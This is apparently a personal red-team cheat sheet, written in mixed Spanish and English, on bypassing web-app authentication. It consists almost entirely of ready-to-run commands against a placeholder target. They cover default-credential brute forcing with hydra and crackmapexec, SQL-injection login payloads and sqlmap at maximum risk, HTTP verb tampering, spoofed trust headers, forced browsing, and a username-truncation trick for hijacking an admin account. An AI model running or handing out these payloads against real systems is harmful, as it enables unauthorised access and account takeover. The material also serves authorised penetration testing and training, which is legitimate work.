---
aliases:
  - Login Bypass
  - SQLi Login
  - Verb Tampering
  - Forced Browsing
tags:
  - vuln/auth-bypass
  - technique/initial-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Authentication & Authorization Bypass]]"
---
# Auth Bypass - Bypass de Autenticación

---

## Default Credentials

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt target.com https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Bulk default creds login form | Standard discovery. |
| `nuclei -t http/default-logins/ -u https://target/` | Templates default-login curados | Auto-detection. |
| `crackmapexec smb target -u admin -p password` | SMB default creds | Network protocol. |
| `crackmapexec ssh target -u root -p root` | SSH default creds | Network. |
| `curl -u admin:admin https://target/admin` (Basic auth) | Quick HTTP Basic test | Auth Basic header. |
| `curl -u tomcat:s3cret https://target/manager/html` | Tomcat manager defaults | Tomcat-specific. |
| `for u in admin root manager test guest; do for p in $u password 1234 admin admin123; do curl -s -u "$u:$p" https://target/admin \| grep -q "200 OK" && echo "[+] $u:$p"; done; done` | Bash bulk probe | Manual. |
| `curl -u 'cisco:cisco' https://target/` o `curl -u 'pi:raspberry' https://target/` | Network gear / IoT defaults | Per-vendor. |
| Browser → vendor docs página default credentials → lookup product específico | OSINT vendor defaults | Specific app. |
^auth-bypass-defaults

---

## SQL Injection en Login

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "user=admin' OR '1'='1' -- &pass=x" https://target/login` | Classic auth bypass | Filter `WHERE user='{u}' AND pass='{p}'`. |
| `curl -d "user=admin'-- &pass=x" https://target/login` | Comment cierra resto del filter | Standard. |
| `curl -d "user=admin' #&pass=x" https://target/login` | MySQL hash comment | MySQL backend. |
| `curl -d "user=' OR 1=1 -- &pass=x" https://target/login` | Sin username conocido | Universal bypass. |
| `curl -d "user=admin' AND 1=2 UNION SELECT 1,'admin','admin' -- &pass=x" https://target/login` | Union para fake row | Filter columns conocidos. |
| `curl -d "user=' UNION SELECT 1,2,3,4 -- &pass=x" https://target/login` | Union enumeration | Discovery columns. |
| `curl -d "user=admin' OR (SELECT SLEEP(5)) -- &pass=x" https://target/login` y medir tiempo | Time-based blind oracle | Sin output. |
| `curl --data-urlencode "user=admin%27%20OR%20%271%27%3D%271%27%20--%20" -d "pass=x" https://target/login` | URL-encoded bypass | Filter naive. |
| `sqlmap -u https://target/login --data='user=x&pass=x' --forms --batch` | Auto-explotar login form | Tool-driven. |
| `sqlmap -r login.req --forms --batch --level 5 --risk 3` | Saved request + max coverage | Comprehensive. |
^auth-bypass-sqli

---

## HTTP Verb Tampering

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/admin` | Method bypass — auth check solo en GET | Common bug. |
| `curl -X PUT https://target/admin/config` | PUT bypass | Modern API. |
| `curl -X DELETE https://target/admin/users/1` | DELETE bypass | API. |
| `curl -X OPTIONS https://target/admin -i \| grep -i allow` | Lista métodos permitidos en endpoint | Recon. |
| `curl -X HEAD https://target/admin -i` | Headers sin body — info disclosure | Filter bypass. |
| `curl -X TRACE https://target/admin` | Diagnostic legacy | Edge legacy. |
| `curl -X FOO https://target/admin` | Random method — some servers default a GET | Fail-open. |
| `curl -X POST -H "X-HTTP-Method-Override: DELETE" https://target/admin/users/1` | Method override header | Spring/Symfony. |
| `curl -X POST -d "_method=DELETE" https://target/admin/users/1` | Method override body field | Rails/Laravel. |
| `curl -X "GeT" https://target/admin` (case mixed) | Case sensitivity bypass | Strict parsers. |
| `for m in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE FOO; do echo "=== $m ==="; curl -s -X $m https://target/admin -o /dev/null -w "%{http_code}\n"; done` | Bulk method probe | Discovery. |
^auth-bypass-verb

---

## Header Spoofing

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin` | IP allowlist bypass — internal trust | Backend trusts XFF. |
| `curl -H "X-Real-IP: 127.0.0.1" https://target/admin` | nginx-style IP spoof | nginx-fronted apps. |
| `curl -H "True-Client-IP: 127.0.0.1" https://target/admin` | Akamai-style | CDN-fronted. |
| `curl -H "Cf-Connecting-IP: 127.0.0.1" https://target/admin` | Cloudflare IP spoof | CF no strip. |
| `curl -H "X-Forwarded-Host: localhost" https://target/admin` | Trusted Host bypass | Internal Host trust. |
| `curl -H "X-Original-URL: /admin" https://target/` | Path override IIS | IIS-specific WAF bypass. |
| `curl -H "X-Rewrite-URL: /admin" https://target/` | IIS variant | Same idea. |
| `curl -H "Authorization: Basic $(echo -n 'admin:admin' \| base64)" https://target/admin` | Basic auth con default creds | Quick test. |
| `curl -H "X-Authenticated-User: admin" https://target/` | Custom auth header trust | App-specific. |
| `curl -H "X-User-Id: 1" https://target/` | Numeric ID injection | Custom auth. |
| `curl -H "X-Forwarded-User: admin" https://target/` | Apache/nginx auth proxy header | Auth proxy config. |
| `curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target/admin` | Atlassian/Confluence CVE | Confluence apps. |
| `for h in 'X-Forwarded-For' 'X-Real-IP' 'True-Client-IP' 'X-Forwarded-Host' 'X-Original-URL' 'X-Custom-IP-Authorization'; do curl -sI -H "$h: 127.0.0.1" https://target/admin \| head -1; done` | Bulk header bypass probe | Discovery. |
^auth-bypass-headers

---

## Forced Browsing (Direct Access)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl https://target/admin` | Direct path access — auth solo client-side | Client-side check. |
| `curl https://target/api/admin/users` (sin token) | API endpoint direct | Backend trusts token presence. |
| `dirsearch -u https://target/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` | Bulk path enumeration | Discovery. |
| `ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt -mc 200,302` | Fast admin panel discovery | Targeted. |
| `gobuster dir -u https://target -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,bak,old` | Extensions + paths | Multi-extension. |
| `curl https://target//admin` y `curl https://target/./admin` y `curl https://target/.//admin` | Path normalization tricks | Router bypass. |
| `curl https://target/admin/` y `curl https://target/admin` | Trailing slash differential | Router config. |
| `curl https://target/v1/admin` y `curl https://target/v2/admin` | API version differential | Old version sin auth. |
| `curl https://target/admin.bak` o `curl https://target/.admin` | Backup paths | Hidden files. |
| `curl https://target/robots.txt` y `curl https://target/sitemap.xml` | Sitemap-listed paths | OSINT recon. |
| `gau target.com \| grep -iE 'admin\|dashboard\|panel'` | Wayback historical URLs | Historical paths. |
| `katana -u https://target -jc \| grep -iE 'admin\|api'` | JS-extracted paths | Frontend route discovery. |
^auth-bypass-forced

---

## Truncation Attack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d "user=admin                                        x&password=attackerpass" https://target/register` | Register con username `admin`+padding+`x` → DB trunca a `admin` | DB col VARCHAR(20) fixed length. |
| `curl -X POST -d "user=admin\r\n\r\n\r\n&password=x" https://target/register` | MS SQL whitespace ignore | SQL Server. |
| `curl --data-urlencode "user=admin%00garbage" -d "password=x" https://target/register` | NUL byte truncation | C-string parsing. |
| Login post-register: `curl -d "user=admin&password=attackerpass" https://target/login` | Login with truncated `admin` user + atacante's password | Account hijack via DB truncation. |
| `python3 -c "print('admin' + ' '*100 + 'x')"` y enviar como username | Generate padded username | Custom length. |
| `curl --data-urlencode "user=admin                                        " -d "password=x" https://target/register` (espacios solo) | Trailing whitespace ignore | Mass register approach. |
^auth-bypass-truncation

---
